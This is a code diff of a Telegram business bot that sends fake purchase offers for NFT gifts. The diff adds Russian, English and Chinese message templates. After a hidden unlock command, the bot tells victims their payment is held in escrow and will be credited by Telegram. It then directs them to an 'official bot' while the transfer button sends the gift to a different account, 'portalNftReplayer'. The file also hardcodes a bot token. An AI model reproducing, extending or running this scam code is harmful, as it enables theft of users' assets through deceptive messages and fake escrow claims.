@@ -10,14 +10,8 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
 
-# ==========================================
-# ВСТАВЬ СЮДА СВОЙ НОВЫЙ ТОКЕН (если отзывал старый)
 BOT_TOKEN = "9150035187:AAHA1yqlsiU1CwnGECEMP5VX_1cFrG4t0Ho"
-# ==========================================
-
-# ТВОЯ ССЫЛКА НА RENDER (уже вставлена)
 RENDER_URL = "https://portals-ams5.onrender.com" 
-
 SECRET_KEY = "/unlock_8f3k2m9x" 
 
 logging.basicConfig(level=logging.INFO)
@@ -26,7 +20,6 @@ dp = Dispatcher()
 
 AUTHORIZED_USERS = set()
 
-# --- ВЕБ-СЕРВЕР ДЛЯ RENDER ---
 app = Flask(__name__)
 
 @app.route('/')
@@ -37,18 +30,43 @@ def run_flask():
     port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port)
 
-# --- ФУНКЦИЯ ПИНГА (ЧТОБЫ RENDER НЕ СПАЛ) ---
 async def keep_alive():
     while True:
         try:
             async with aiohttp.ClientSession() as session:
                 async with session.get(RENDER_URL) as response:
-                    print(f"Keep-alive ping: {response.status}")
-        except Exception as e:
-            print(f"Keep-alive error: {e}")
-        await asyncio.sleep(600) # Ждать 10 минут (600 секунд)
+                    pass
+        except Exception:
+            pass
+        await asyncio.sleep(600)
 
-# --- ЛОГИКА БОТА ---
+TEXTS = {
+    "ru": {
+        "offer": "Пользователь {user_link}\nпредлагает вам {price} за подарок\n\"{nft_name}\".\n\nПредложение действует еще 24h 00m.\n<a href='{nft_link}'></a>",
+        "btn_show": "ПОКАЗАТЬ ПОДАРОК",
+        "btn_decline": "Отклонить",
+        "btn_accept": "Принять",
+        "accepted": "<b>Покупатель зарезервировал ваш подарок.</b>\n\n<blockquote>Средства хранятся на специальном эскроу-счете и будут зачислены на баланс после передачи подарка.\n\n<b>Для завершения сделки:</b>\n1. Передайте подарок официальному боту: {transfer_bot}\n2. Нажмите «Передать NFT» и выберите NFT.\n3. Подтвердите передачу подарка.\n\nTelegram зафиксирует транзакцию и моментально зачислит {price} на ваш аккаунт.\n\n<b>Резерв действует 24 часа.</b></blockquote>",
+        "btn_transfer": "Передать NFT"
+    },
+    "en": {
+        "offer": "User {user_link}\noffers you {price} for the gift\n\"{nft_name}\".\n\nOffer valid for another 24h 00m.\n<a href='{nft_link}'></a>",
+        "btn_show": "SHOW GIFT",
+        "btn_decline": "Decline",
+        "btn_accept": "Accept",
+        "accepted": "<b>The buyer has reserved your gift.</b>\n\n<blockquote>Funds are held in a special escrow account and will be credited to the balance after the gift is transferred.\n\n<b>To complete the deal:</b>\n1. Transfer the gift to the official bot: {transfer_bot}\n2. Click 'Transfer NFT' and select the NFT.\n3. Confirm the transfer of the gift.\n\nTelegram will record the transaction and instantly credit {price} to your account.\n\n<b>The reservation is valid for 24 hours.</b></blockquote>",
+        "btn_transfer": "Transfer NFT"
+    },
+    "zh": {
+        "offer": "用户 {user_link}\n向您提供 {price} 购买礼物\n\"{nft_name}\"。\n\n报价有效期为 24小时 00分钟。\n<a href='{nft_link}'></a>",
+        "btn_show": "显示礼物",
+        "btn_decline": "拒绝",
+        "btn_accept": "接受",
+        "accepted": "<b>买家已预订您的礼物。</b>\n\n<blockquote>资金存放在特殊的托管账户中，将在礼物转移后记入余额。\n\n<b>完成交易：</b>\n1. 将礼物转移给官方机器人：{transfer_bot}\n2. 点击“转移 NFT”并选择 NFT。\n3. 确认礼物转移。\n\nTelegram 将记录交易并立即将 {price} 记入您的账户。\n\n<b>预订有效期为 24 小时。</b></blockquote>",
+        "btn_transfer": "转移 NFT"
+    }
+}
+
 @dp.business_message(F.text == SECRET_KEY)
 async def unlock_bot(message: types.Message):
     AUTHORIZED_USERS.add(message.from_user.id)
@@ -65,7 +83,7 @@ async def unlock_bot(message: types.Message):
         business_connection_id=message.business_connection_id
     )
 
-@dp.business_message(F.text.startswith("/price"))
+@dp.business_message(F.text.regexp(r"^/(price|prace|proce)\s+"))
 async def handle_price_command(message: types.Message):
     if message.from_user.id not in AUTHORIZED_USERS:
         return
@@ -78,12 +96,22 @@ async def handle_price_command(message: types.Message):
     except Exception as e:
         logging.error(f"Не удалось удалить команду: {e}")
 
-    pattern = r"^/price\s+(https?://\S+)\s+([\d\.]+)\s+(gram|stars)(?:\s+(@\w+))?$"
+    command = message.text.split()[0].lower()
+    if command == "/price":
+        lang = "ru"
+    elif command == "/prace":
+        lang = "en"
+    else:
+        lang = "zh"
+    
+    t = TEXTS[lang]
+
+    pattern = r"^/(price|prace|proce)\s+(https?://\S+)\s+([\d\.]+)\s+(gram|stars)(?:\s+(@\w+))?$"
     match = re.match(pattern, message.text, re.IGNORECASE)
     if not match:
         return
 
-    nft_link, price_value, currency, target_user = match.groups()
+    _, nft_link, price_value, currency, target_user = match.groups()
     currency = currency.lower()
 
     nft_name_raw = nft_link.split('/')[-1].replace('-', '')
@@ -91,22 +119,22 @@ async def handle_price_command(message: types.Message):
 
     price_text = f"{price_value} ⭐" if currency == "stars" else f"{price_value} 💎"
 
-    callback_data = f"accept:{price_text}"
+    user_link = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a>"
+
+    final_text = t["offer"].format(
+        user_link=user_link, 
+        price=price_text, 
+        nft_name=nft_name_formatted, 
+        nft_link=nft_link
+    )
 
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=t["btn_show"], url=nft_link)],
         [
-            InlineKeyboardButton(text="Отклонить", callback_data="decline_offer"),
-            InlineKeyboardButton(text="Принять", callback_data=callback_data)
+            InlineKeyboardButton(text=t["btn_decline"], callback_data=f"decline:{lang}"),
+            InlineKeyboardButton(text=t["btn_accept"], callback_data=f"accept:{price_text}:{lang}")
         ]
     ])
-
-    final_text = (
-        f"Пользователь <a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a>\n"
-        f"предлагает вам {price_text} за подарок\n"
-        f"\"{nft_name_formatted}\".\n\n"
-        f"Предложение действует еще 24h 00m.\n\n"
-        f"{nft_link}"
-    )
 
     try:
         await bot.send_message(
@@ -126,27 +154,21 @@ async def accept_offer(callback: types.CallbackQuery):
     try:
         parts = callback.data.split(":")
         price_str = parts[1]
+        lang = parts[2]
+        
+        t = TEXTS[lang]
 
         transfer_bot = "@portals_nftbot"
-        
-        new_text = (
-            f"<b>Покупатель зарезервировал ваш подарок.</b>\n\n"
-            f"<blockquote>"
-            f"Средства хранятся на специальном эскроу-счете и будут зачислены на баланс после передачи подарка.\n\n"
-            f"<b>Для завершения сделки:</b>\n"
-            f"1. Передайте подарок официальному боту: {transfer_bot}\n"
-            f"2. Нажмите «Передать NFT» и выберите NFT.\n"
-            f"3. Подтвердите передачу подарка.\n\n"
-            f"Telegram зафиксирует транзакцию и моментально зачислит {price_str} на ваш аккаунт.\n\n"
-            f"<b>Резерв действует 24 часа.</b>"
-            f"</blockquote>"
-        )
-
         target_username = "portalNftReplayer" 
         gift_link = f"tg://send_gift?to={target_username}"
 
+        new_text = t["accepted"].format(
+            transfer_bot=transfer_bot, 
+            price=price_str
+        )
+
         new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Передать NFT", url=gift_link)]
+            [InlineKeyboardButton(text=t["btn_transfer"], url=gift_link)]
         ])
 
         await bot.edit_message_text(
@@ -160,16 +182,15 @@ async def accept_offer(callback: types.CallbackQuery):
         logging.error(f"Ошибка в кнопке: {e}")
         await callback.answer(f"Ошибка: {e}", show_alert=True)
 
-@dp.callback_query(F.data == "decline_offer")
+@dp.callback_query(F.data.startswith("decline:"))
 async def decline_offer(callback: types.CallbackQuery):
-    await callback.answer("Вы отклонили предложение.", show_alert=True)
+    lang = callback.data.split(":")[1]
+    msg = "Вы отклонили предложение." if lang == "ru" else ("You have declined the offer." if lang == "en" else "您已拒绝该报价。")
+    await callback.answer(msg, show_alert=True)
 
 async def main():
     Thread(target=run_flask, daemon=True).start()
-    
-    # Запускаем фоновую задачу пинга
     asyncio.create_task(keep_alive()) 
-    
     print("Бот запущен. Ожидание секретного ключа...")
     await dp.start_polling(bot, allowed_updates=["business_connection", "business_message", "callback_query"])
 
